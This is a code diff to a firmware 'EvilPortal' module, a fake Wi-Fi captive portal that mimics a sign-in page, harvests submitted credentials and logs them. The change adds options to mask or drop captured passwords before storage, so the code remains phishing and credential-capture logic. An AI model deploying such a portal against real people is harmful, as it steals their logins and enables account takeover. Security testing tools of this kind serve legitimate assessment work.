@@ -250,8 +250,13 @@ void EvilPortal::drawScreen() {
     } else {
         padprint("Attempt: " + String(totalCapturedCredentials));
     }
-
-    padprintln("");
+    String passMode = "";
+    switch (bruceConfig.evilPortalPasswordMode) {
+        case FULL_PASSWORD: passMode = "Full"; break;
+        case FIRST_LAST_CHAR: passMode = "first/last: p******d"; break;
+        case HIDE_PASSWORD: passMode = "Hidden: *hidden*"; break;
+    }
+    padprint("Password mode: " + passMode);
     printLastCapturedCredential();
 
     printDeauthStatus();
@@ -513,17 +518,43 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             continue;
         }
 
-        // get key if verify
+        // get key if verify and before blanking
         if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }
 
+        String valueBuffer = request->arg(i);
+
+        if (key == "password") {
+            char blank = '*';
+            switch (bruceConfig.evilPortalPasswordMode) {
+                case FULL_PASSWORD:
+                    // do nothing, already have full password and want to save it
+                    break;
+                case FIRST_LAST_CHAR:
+                    // overwrite the middle of the passwordValue with *s
+                    if (valueBuffer.length() > 2) {
+                        for (int i = 1; i < valueBuffer.length() - 1; i++) { valueBuffer[i] = blank; }
+                    }
+                    // otherwise don't blank anything if pwd is < 2 chars
+                    break;
+                case HIDE_PASSWORD:
+                    // overwrite the passwordValue with '*hidden*'
+                    valueBuffer = "*hidden*";
+                    break;
+                case SAVE_LENGTH:
+                    // overwrite the passwordValue with 'X chars'
+                    valueBuffer = String(valueBuffer.length()) + " chars";
+                    break;
+            }
+        }
+
         // Build HTML and CSV line
-        htmlResponse += key + ": " + request->arg(i) + "<br>\n";
+        htmlResponse += key + ": " + valueBuffer + "<br>\n";
         if (i > 0) { csvLine += ","; }
 
         // Skip irrelevant parameters
 
-        csvLine += key + ": " + request->arg(i);
-        lastCred += key.substring(0, 3) + ": " + request->arg(i) + "\n";
+        csvLine += key + ": " + valueBuffer;
+        lastCred += key.substring(0, 3) + ": " + valueBuffer + "\n";
     }
 
     htmlResponse += "</li>\n";
@@ -554,7 +585,6 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
             saveToCSV(csvLine + ", valid: false", true);
             portalController(request);
         }
-
     } else {
         saveToCSV(csvLine);
         request->send(200, "text/html", wifiLoadPage());
@@ -576,7 +606,8 @@ String EvilPortal::getHtmlTemplate(String body) {
         "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
         "  <style>a:hover{text-decoration: underline;}body{font-family: Arial, sans-serif;align-items: "
         "center;justify-content: center;background-color: #FFFFFF;}input[type='text'], "
-        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: "
+        "input[type='password']{width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: "
+        "border-box;border: "
         "1px solid #cccccc;border-radius: 4px;}.container{margin: auto;padding: 20px;max-width: "
         "700px;}.logo-container{text-align: center;margin-bottom: 30px;display: flex;justify-content: "
         "center;align-items: center;}.logo{width: 40px;height: 40px;fill: #FFC72C;margin-right: "
@@ -588,8 +619,10 @@ String EvilPortal::getHtmlTemplate(String body) {
         "none;padding: 12px 20px;border-radius: 4px;font-size: 0.875rem;}.submit-btn:hover{background: "
         "#0e4eb3;}.forgot-btn{background: transparent;color: #0b57d0;border-radius: 8px;border: "
         "none;font-size: 14px;cursor: pointer;}.forgot-btn:hover{background-color: "
-        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: #202124;font-size: "
-        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px 0px "
+        "rgba(11,87,208,0.08);}.containerlogo{padding-top: 25px;}.containertitle{color: "
+        "#202124;font-size: "
+        "24px;padding: 15px 0px 10px 0px;}.containersubtitle{color: #202124;font-size: 16px;padding: 0px "
+        "0px "
         "30px 0px;}.containerbtn{display: flex;justify-content: end;padding: 30px 0px 25px 0px;}@media "
         "screen and (min-width: 768px){.logo{max-width: 80px;max-height: 80px;}}</style>"
         "</head>"
@@ -614,7 +647,8 @@ String EvilPortal::getHtmlTemplate(String body) {
 String EvilPortal::creds_GET() {
     return getHtmlTemplate(
         "<ol>" + capturedCredentialsHtml +
-        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" "
+        "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
+        "style=\"color:blue\" "
         "href=/clear>Clear passwords</a></p></center>"
     );
 }
